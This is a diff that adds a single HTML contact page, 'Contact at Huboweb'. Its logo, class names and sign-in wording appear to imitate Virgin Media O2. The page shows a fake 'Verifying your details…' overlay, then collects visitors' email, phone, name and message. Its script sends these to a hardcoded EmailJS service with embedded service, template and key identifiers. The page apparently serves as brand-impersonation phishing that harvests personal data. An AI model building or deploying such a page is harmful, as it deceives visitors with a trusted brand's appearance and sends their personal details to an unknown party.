@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <title>Contact at Huboweb</title>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body {
+      height: 100%; margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      font-size: 16px; color: #1a1a1a; background: #fff;
+    }
+    .container-wrapper { display: flex; flex-direction: column; min-height: 100vh; }
+    .content { flex: 1; }
+
+    /* HEADER */
+    header.vmo2-header {
+      position: relative; background: #fff;
+      text-align: center; padding: 16px 0 0; z-index: 10;
+    }
+    .header-logo-wrap {
+      position: relative; z-index: 20;
+      display: inline-flex; align-items: center;
+      justify-content: center; padding-bottom: 12px;
+    }
+    .header-flare {
+      position: absolute; bottom: -1px; left: 0; right: 0;
+      height: 55px; overflow: hidden; z-index: 5;
+    }
+    .header-flare svg {
+      width: 100%; height: 100%;
+      filter: drop-shadow(0px 5px 10px rgba(100,100,100,0.22));
+    }
+
+    /* LOGO */
+    .logo-vm {
+      width: 56px; height: 38px;
+      border: 2px solid #e4002b; border-radius: 50%;
+      display: inline-flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      background: #fff; line-height: 1; padding: 3px 5px;
+      position: relative; z-index: 25;
+    }
+    .logo-vm .vm-top { font-size: 7px; font-weight: 800; color: #e4002b; font-style: italic; line-height: 1.1; }
+    .logo-vm .vm-mid { font-size: 9px; font-weight: 800; color: #e4002b; letter-spacing: -0.3px; line-height: 1.1; }
+    .logo-vm .vm-bot { width: 80%; height: 1.5px; background: #e4002b; border-radius: 1px; margin-top: 1px; }
+    .logo-o2 {
+      width: 42px; height: 42px; border-radius: 50%;
+      border: 3px solid #0000cc; background: #fff;
+      display: inline-flex; align-items: center; justify-content: center;
+      margin-left: -6px; position: relative; z-index: 24;
+    }
+    .logo-o2 span { font-size: 20px; font-weight: 900; font-style: italic; color: #0000cc; font-family: Georgia,serif; letter-spacing: -1.5px; padding-left: 2px; }
+    .logo-o2 sup { font-size: 9px; font-weight: 900; color: #0000cc; vertical-align: super; line-height: 0; margin-left: -2px; }
+
+    /* BODY */
+    .page-body { padding: 40px 24px 40px; max-width: 560px; }
+    .T600 { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 20px; line-height: 1.25; }
+    .T300 { font-size: 14.5px; color: #1a1a1a; line-height: 1.55; margin-bottom: 0; }
+    .T300 a, .anchor { color: #0000cc; text-decoration: underline; cursor: pointer; }
+    .T300 a:hover { color: #0000aa; }
+    .email-shown { font-size: 14.5px; font-weight: 700; color: #1a1a1a; margin-bottom: 20px; }
+    .form-label { font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 6px; display: block; }
+
+    /* INPUT */
+    .form-control {
+      display: block; width: 100%; max-width: 380px;
+      padding: 13px 42px 13px 13px;
+      font-size: 15px; font-family: inherit; color: #1a1a1a;
+      background: #f0f0f0; border: 1.5px solid #d0d0d0;
+      border-radius: 5px; outline: none;
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .form-control:focus { border-color: #0000cc; background: #fff; box-shadow: 0 0 0 2px rgba(0,0,200,0.1); }
+    .form-control::placeholder { color: #999; }
+    textarea.form-control { min-height: 100px; resize: none; padding-right: 13px; }
+    .input-wrap { position: relative; max-width: 380px; }
+    .input-icon {
+      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+      color: #555; font-size: 17px; cursor: pointer;
+      background: none; border: none; padding: 0; line-height: 1;
+    }
+
+    /* VALIDATION */
+    .val-error { font-size: 13px; color: #cc0000; margin-top: 5px; display: none; }
+    .val-error.show { display: flex; align-items: center; gap: 4px; }
+    .forgot-wrap { margin-top: 10px; margin-bottom: 4px; }
+
+    /* BUTTONS */
+    .btn-vmo2-primary {
+      display: flex; width: 100%; max-width: 380px;
+      background: #0000cc; color: #fff; border: none; border-radius: 5px;
+      padding: 14px 20px; font-size: 15px; font-weight: 600;
+      font-family: inherit; cursor: pointer; text-align: center;
+      margin-top: 22px; margin-bottom: 16px;
+      align-items: center; justify-content: center; gap: 8px;
+      transition: background .15s;
+    }
+    .btn-vmo2-primary:hover { background: #0000aa; }
+    .btn-vmo2-primary:disabled { opacity: .7; cursor: not-allowed; }
+    .btn-vmo2-outline {
+      display: block; width: 100%; max-width: 380px;
+      background: #fff; color: #0000cc; border: 2px solid #0000cc;
+      border-radius: 5px; padding: 12px 20px; font-size: 15px; font-weight: 600;
+      font-family: inherit; cursor: pointer; text-align: center;
+      margin-bottom: 20px; transition: background .15s;
+    }
+    .btn-vmo2-outline:hover { background: #f0f0ff; }
+    .exit-link {
+      font-size: 14.5px; color: #0000cc; text-decoration: underline;
+      cursor: pointer; background: none; border: none; padding: 0;
+      font-family: inherit; display: inline-block; margin-top: 4px;
+    }
+
+    /* FOOTER */
+    footer.vmo2-footer { background: #000; color: #ccc; display: flex; flex-wrap: wrap; }
+    footer.vmo2-footer div { font-size: 13px; padding: 18px 20px; line-height: 1.55; flex: 1; min-width: 200px; }
+
+    /* SPINNER */
+    .spinner {
+      display: inline-block; width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
+      border-radius: 50%; animation: spin .7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* VERIFYING overlay */
+    #verifying-overlay {
+      display: none;
+      position: fixed; inset: 0; background: rgba(255,255,255,0.92);
+      z-index: 9999; flex-direction: column;
+      align-items: center; justify-content: center; gap: 18px;
+    }
+    #verifying-overlay.show { display: flex; }
+    .verify-spinner {
+      width: 42px; height: 42px;
+      border: 4px solid #d0d0d0; border-top-color: #0000cc;
+      border-radius: 50%; animation: spin .8s linear infinite;
+    }
+    .verify-text { font-size: 16px; font-weight: 600; color: #0000cc; }
+
+    .btn-primary { background-color: #0000cc !important; border-color: #0000cc !important; }
+    .btn-primary:hover { background-color: #0000aa !important; }
+
+    @media (max-width: 520px) {
+      .page-body { padding: 32px 20px 36px; }
+      .T600 { font-size: 20px; }
+    }
+  </style>
+</head>
+
+<body>
+<div class="container-wrapper">
+
+  <!-- HEADER -->
+  <header class="vmo2-header">
+    <div class="header-logo-wrap">
+      <div class="logo-vm" aria-label="Huboweb">
+        <span class="vm-top">Virgin</span>
+        <span class="vm-mid">Hubo</span>
+        <div class="vm-bot"></div>
+      </div>
+      <div class="logo-o2" aria-label="O2">
+        <span>O<sup>2</sup></span>
+      </div>
+    </div>
+    <div class="header-flare">
+      <svg preserveAspectRatio="none" viewBox="0 0 1440 55" aria-hidden="true">
+        <path d="M0,0 L1440,0 L1440,30 C1200,46 960,55 720,55 C480,55 240,46 0,30 L0,0 Z" fill="#fff"/>
+        <path d="M360,0 L1440,0 L1440,14 C1259,28 1088,35 926,35 C678,35 489,20 360,0 Z" fill="rgba(255,255,255,0.07)"/>
+      </svg>
+    </div>
+  </header>
+
+  <div class="content">
+    <div class="container-fluid p-0">
+      <div class="page-body">
+
+        <!-- Info modal -->
+        <div class="modal fade" id="infoModal" tabindex="-1" aria-hidden="true">
+          <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+              <div class="modal-header">
+                <h5 class="modal-title" style="font-size:15px;font-weight:600">About your email address</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+              </div>
+              <div class="modal-body">
+                <p style="font-size:14px;line-height:1.6">Enter the email address you'd like us to reply to. We'll use this to get back to you as soon as possible.</p>
+              </div>
+              <div class="modal-footer">
+                <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Close</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Exit modal -->
+        <div class="modal fade" id="exitModal" tabindex="-1" aria-hidden="true">
+          <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+              <div class="modal-header">
+                <h5 class="modal-title" style="font-size:15px;font-weight:600">Exit</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+              </div>
+              <div class="modal-body"><p style="font-size:14px">Are you sure you want to exit?</p></div>
+              <div class="modal-footer">
+                <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="window.location.href='/'">Yes, I'm sure</button>
+                <button type="button" class="btn btn-primary" style="background:#fff!important;color:#0000cc!important;border:2px solid #0000cc!important" data-bs-dismiss="modal">No, I'll continue</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ══ STEP 1: Email + Contact Number ══ -->
+        <div id="step1">
+          <p class="T600">Contact at Huboweb</p>
+          <p class="T300 mb-3">
+            Enter your email address to get started.
+            <a class="anchor" data-bs-toggle="modal" data-bs-target="#infoModal" href="#">Learn more.</a>
+          </p>
+
+          <!-- Email field -->
+          <div style="margin-bottom:16px">
+            <label class="form-label" for="inp-email">Email address</label>
+            <div class="input-wrap">
+              <input class="form-control" type="email" id="inp-email"
+                placeholder="" autocomplete="email" autocorrect="off" autocapitalize="off"
+                onkeypress="return emailKeyPress(event)"/>
+            </div>
+            <div class="val-error" id="err-email">
+              <i class="fa-solid fa-xmark" style="font-size:12px;color:#cc0000"></i>
+              Please enter a valid email address
+            </div>
+            <p class="T300 forgot-wrap">
+              <a class="anchor" href="#" tabindex="0">Forgot your email address?</a>
+            </p>
+          </div>
+
+          <!-- Contact number field — same pattern as email -->
+          <div style="margin-bottom:8px">
+            <label class="form-label" for="inp-phone">Contact number</label>
+            <div class="input-wrap">
+              <input class="form-control" type="tel" id="inp-phone"
+                placeholder="" autocomplete="tel"/>
+            </div>
+            <div class="val-error" id="err-phone">
+              <i class="fa-solid fa-xmark" style="font-size:12px;color:#cc0000"></i>
+              Please enter a valid contact number
+            </div>
+            <p class="T300 forgot-wrap">
+              <a class="anchor" href="#" tabindex="0">Don't have a contact number?</a>
+            </p>
+          </div>
+
+          <button class="btn-vmo2-primary" onclick="goStep2()">
+            <i class="fa-solid fa-lock" style="font-size:14px"></i>
+            Verifying
+          </button>
+
+          <p class="T300 mb-2">Need help registering or signing in? <a class="anchor" href="#" target="_blank">Visit our help pages.</a></p>
+          <p class="T300 my-3">If you're not using your own device, <a class="anchor" href="#" target="_blank">read our help on private browsing</a> before you contact us.</p>
+          <p class="T300">To see how we look after your data, head to <a class="anchor" href="#" target="_blank">Huboweb's Privacy Policy.</a></p>
+        </div>
+
+        <!-- ══ STEP 2: Name + Message ══ -->
+        <div id="step2" style="display:none">
+          <p class="T600">Contact at Huboweb</p>
+          <p class="T300 mb-2">Please fill in your details below and we'll get back to you shortly.</p>
+          <p class="email-shown" id="email-shown"></p>
+
+          <div style="margin-bottom:12px">
+            <label class="form-label" for="inp-name">Full name</label>
+            <div class="input-wrap">
+              <input class="form-control" type="text" id="inp-name" placeholder="" autocomplete="name"/>
+            </div>
+            <div class="val-error" id="err-name">
+              <i class="fa-solid fa-xmark" style="font-size:12px;color:#cc0000"></i>
+              Please enter your full name
+            </div>
+          </div>
+
+          <div style="margin-bottom:4px">
+            <label class="form-label" for="inp-msg">Message</label>
+            <div class="input-wrap">
+              <textarea class="form-control" id="inp-msg" placeholder="How can we help you?"></textarea>
+              <button class="input-icon" onclick="clearMsg()" aria-label="Clear" style="top:16px;transform:none">
+                <i class="fa-regular fa-eye-slash"></i>
+              </button>
+            </div>
+            <div class="val-error" id="err-msg">
+              <i class="fa-solid fa-xmark" style="font-size:12px;color:#cc0000"></i>
+              Please enter your message
+            </div>
+          </div>
+
+          <button class="btn-vmo2-primary" id="submitBtn" onclick="doSend()">
+            <span id="btn-lbl">Submit</span>
+          </button>
+          <button class="btn-vmo2-outline" onclick="goStep1()">I can't remember my email</button>
+          <button class="exit-link" data-bs-toggle="modal" data-bs-target="#exitModal">Exit</button>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer class="vmo2-footer">
+  <div>© <span class="yr"></span> Huboweb. All Rights Reserved</div>
+  <div>© <span class="yr"></span> Huboweb Technologies Limited. All Rights Reserved</div>
+</footer>
+
+<!-- Verifying overlay -->
+<div id="verifying-overlay">
+  <div class="verify-spinner"></div>
+  <div class="verify-text">Verifying your details…</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+// ━━ CONFIGURE EMAILJS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Free signup: https://www.emailjs.com
+// Template variables: {{from_name}} {{from_email}} {{phone}} {{message}}
+const SVC  = 'service_4lmf9kg';
+const TMPL = 'template_t2hk65j';
+const KEY  = 'XEoH2F5IbtUmeag4e';
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+emailjs.init(KEY);
+
+document.querySelectorAll('.yr').forEach(el => el.textContent = new Date().getFullYear());
+
+const emailRe = /^[a-zA-Z0-9%_+-]+(?:\.[a-zA-Z0-9%_+-]+)*@(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?\.)+[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,3}[a-zA-Z0-9])?$/;
+const phoneRe = /^[\d\s\+\-\(\)]{7,20}$/;
+
+document.getElementById('inp-email').addEventListener('input', function(){ this.value=this.value.replace(/\s/g,''); hide('err-email'); });
+document.getElementById('inp-phone').addEventListener('input', ()=> hide('err-phone'));
+document.getElementById('inp-name').addEventListener('input',  ()=> hide('err-name'));
+document.getElementById('inp-msg').addEventListener('input',   ()=> hide('err-msg'));
+
+function hide(id){ document.getElementById(id).classList.remove('show'); }
+function show(id){ document.getElementById(id).classList.add('show'); }
+
+function emailKeyPress(e){
+  if((window.event ? window.event.keyCode : e.which)===13){ goStep2(); return false; }
+  return true;
+}
+
+function goStep2(){
+  let ok = true;
+  const email = document.getElementById('inp-email').value.trim();
+  const phone = document.getElementById('inp-phone').value.trim();
+
+  if(!emailRe.test(email)){ show('err-email'); ok=false; } else hide('err-email');
+  if(!phoneRe.test(phone)){ show('err-phone'); ok=false; } else hide('err-phone');
+  if(!ok) return;
+
+  // Show verifying overlay for 1.5s then move to step 2
+  document.getElementById('verifying-overlay').classList.add('show');
+  setTimeout(() => {
+    document.getElementById('verifying-overlay').classList.remove('show');
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+    document.getElementById('email-shown').textContent = email;
+    document.getElementById('inp-name').focus();
+  }, 1500);
+}
+
+function goStep1(){
+  document.getElementById('step2').style.display = 'none';
+  document.getElementById('step1').style.display = 'block';
+  document.getElementById('inp-email').focus();
+}
+
+function clearMsg(){
+  document.getElementById('inp-msg').value = '';
+  document.getElementById('inp-msg').focus();
+}
+
+async function doSend(){
+  let ok = true;
+  if(!document.getElementById('inp-name').value.trim()){ show('err-name'); ok=false; } else hide('err-name');
+  if(!document.getElementById('inp-msg').value.trim()){ show('err-msg');  ok=false; } else hide('err-msg');
+  if(!ok) return;
+
+  const btn = document.getElementById('submitBtn');
+  const lbl = document.getElementById('btn-lbl');
+  btn.disabled = true;
+  lbl.innerHTML = 'Sending… <span class="spinner"></span>';
+
+  try {
+    await emailjs.send(SVC, TMPL, {
+      from_name:  document.getElementById('inp-name').value.trim(),
+      from_email: document.getElementById('inp-email').value.trim(),
+      phone:      document.getElementById('inp-phone').value.trim(),
+      message:    document.getElementById('inp-msg').value.trim()
+    });
+    lbl.innerHTML = '<i class="fa-solid fa-check"></i> Sent!';
+    setTimeout(()=>{
+      goStep1();
+      btn.disabled = false;
+      lbl.textContent = 'Submit';
+      document.getElementById('inp-name').value = '';
+      document.getElementById('inp-msg').value  = '';
+    }, 2200);
+  } catch(e){
+    console.error(e);
+    lbl.textContent = 'Error — please try again';
+    btn.disabled = false;
+  }
+}
+</script>
+</body>
+</html>
